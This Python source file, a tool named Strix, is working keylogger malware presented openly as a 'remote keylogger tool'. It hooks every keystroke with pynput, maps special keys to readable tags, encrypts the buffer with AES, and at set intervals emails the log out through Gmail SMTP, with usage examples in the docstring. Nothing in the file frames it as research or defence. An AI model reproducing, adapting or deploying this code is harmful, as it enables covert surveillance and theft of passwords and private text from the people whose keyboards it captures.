#!/usr/bin/python
import smtplib
import sys
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.utils import COMMASPACE, formatdate
from email import encoders
from pynput.keyboard import Listener
import threading
import pyAesCrypt
import io
import secrets

'''
Strix is a remote keylogger tool. Running it saves keystrokes to a stream.
At regular intervals, the stream is saved to an AES-256 encrypted file "log.txt.aes" and e-mailed to the e-mail address provided.

Usage: python strix.py <E-mail address> "<App password>" [Time interval] [32-bit Encryption key]

Args:
    - email (str): E-mail address to send the reports to.
    - appPassword (str): A generated app-specific password for authentication.
                Your E-mail's password does not work. For more information, visit https://support.google.com/accounts/answer/185833?hl=en
Options:
    - timeInterval (int): Number of seconds in between every other e-mail sent. Default = 60.
    - key (string): 32-bit encryption key for AES-256 encryption. Changing the length of this key changes the encryption strength.
                If unspecified, the randomly-generated password will be e-mailed with the report.

Example:
    python strix.py "johndoe@gmail.com" "your_app_password_here"
    python strix.py "johndoe@gmail.com" "your_app_password_here" 60
    python strix.py 'johndoe@gmail.com' "your_app_password_here" 60 "0123456789abcdef0123456789abcdef"
'''

BUFFERSIZE = 64*1024

class Keylogger:

    def __init__(self, email, password, interval = 60, key="0123456789abcdef0123456789abcdef"):
        self.logger = ""        # Keystroke stream
        self.email = email
        self.password = password
        self.interval = interval
        self.key = key

        self.logFilename = "log.txt"
        self.encryptedLogFilename = self.logFilename+".aes"
        self.emailSubject = "Keylogger Report Email"
        self.emailBody = "Find attached the Strix keylogger capture, encrypted using AES-256 with the following key {}".format(self.key)

    def appendToLog(self, key):
        keyData = str(key)                  # If you type the letter f, then keyData saves the value 'f' with single quotes.
        keyData = keyData.replace("'","")   # Remove the single quotes
        match keyData:                      # For special characters
            case "Key.alt":
                keyData = "[ALT]"
            case "Key.alt_gr":
                keyData = "[ALT GR]"
            case "Key.alt_l":
                keyData = "[LEFT ALT]"
            case "Key.alt_r":
                keyData = "[RIGHT ALT]"
            case "Key.backspace":
                keyData = "[BACKSPACE]"
            case "Key.caps_lock":
                keyData = "[CAPS LOCK]"
            case "Key.cmd":
                keyData = "[SUPER]"
            case "Key.cmd_l":
                keyData = "[SUPER LEFT]"
            case "Key.cmd_r":
                keyData = "[SUPER RIGHT]"
            case "Key.ctrl":
                keyData = "[CTRL]"
            case "Key.ctrl_l":
                keyData = "[LEFT CTRL]"
            case "Key.ctrl_r":
                keyData = "[RIGHT CTRL]"
            case "Key.delete":
                keyData = "[DELETE]"
            case "Key.down":
                keyData = "[DOWN ARROW]"
            case "Key.end":
                keyData = "[END]"
            case "Key.enter":
                keyData = "\n"
            case "Key.esc":
                keyData = "[ESCAPE]"
            case "Key.f1":
                keyData = "[F1]"
            case "Key.f2":
                keyData = "[F2]"
            case "Key.f3":
                keyData = "[F3]"
            case "Key.f4":
                keyData = "[F4]"
            case "Key.f5":
                keyData = "[F5]"
            case "Key.f6":
                keyData = "[F6]"
            case "Key.f7":
                keyData = "[F7]"
            case "Key.f8":
                keyData = "[F8]"
            case "Key.f9":
                keyData = "[F9]"
            case "Key.f10":
                keyData = "[F10]"
            case "Key.f11":
                keyData = "[F11]"
            case "Key.f12":
                keyData = "[F12]"
            case "Key.home":
                keyData = "[HOME]"
            case "Key.insert":
                keyData = "[INSERT]"
            case "Key.left":
                keyData = "[LEFT ARROW]"
            case "Key.menu":
                keyData = "[MENU]"
            case "Key.num_lock":
                keyData = "[NUM LOCK]"
            case "Key.page_down":
                keyData = "[PAGE DOWN]"
            case "Key.page_up":
                keyData = "[PAGE UP]"
            case "Key.pause":
                keyData = "[PAUSE]"
            case "Key.print_screen":
                keyData = "[PRINT SCREEN]"
            case "Key.right":
                keyData = "[RIGHT ARROW]"
            case "Key.scroll_lock":
                keyData = "[SCROLL LOCK]"
            case "Key.shift":
                keyData = ""
            case "Key.shift_l":
                keyData = ""
            case "Key.shift_r":
                keyData = ""
            case "Key.space":
                keyData = " "
            case "Key.tab":
                keyData = "   "
            case "Key.up":
                keyData = "[UP ARROW]"
            case _:
                pass
        self.logger = self.logger + keyData # append to stream
        # with open(self.logFilename, "a") as log: # Opens the file if exists, creates it if it does not. Opens in append mode.
        #     log.write(keyData)

    def report(self):
        streamData = self.logger.encode('utf-8')
        self.logger = ""

        fIn = io.BytesIO(streamData)
        with open(self.encryptedLogFilename, "wb") as fOut:
            pyAesCrypt.encryptStream(fIn, fOut, self.key, BUFFERSIZE)

        self.sendMail()
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def sendMail(self, server="smtp.gmail.com", port=587, useTLS=True):
        sendFrom = self.email
        sendTo = self.email
        subject = self.emailSubject
        body = self.emailBody
        file = self.encryptedLogFilename

        message = MIMEMultipart()
        message['From'] = sendFrom
        message['To'] = sendTo
        message['Date'] = formatdate(localtime=True)
        message['Subject'] = subject
        message.attach(MIMEText(body))

        part = MIMEBase('application', "octet-stream")
        with open(file, 'rb') as content:
            part.set_payload(content.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', 'attachment; filename={}'.format(file))
        message.attach(part)

        smtp = smtplib.SMTP(server, port)
        if useTLS:
            smtp.starttls()
        smtp.login(self.email, self.password)
        print("Sending mail...")
        smtp.sendmail(sendFrom, sendTo, message.as_string())
        smtp.quit()

    def start(self):
        with Listener(on_press=self.appendToLog) as listener:
            self.report()
            listener.join()

if __name__ == "__main__":
    email = str(sys.argv[1])
    appPassword = str(sys.argv[2])
    interval = ""
    key = ""
    if len(sys.argv) > 3:
        interval = int(sys.argv[3])
    else:
        interval = 60
    if len(sys.argv) > 4:
        key = str(sys.argv[4])
    else:
        key= secrets.token_hex(4)
    keyLogger = Keylogger(email, appPassword, interval, key)
    keyLogger.start()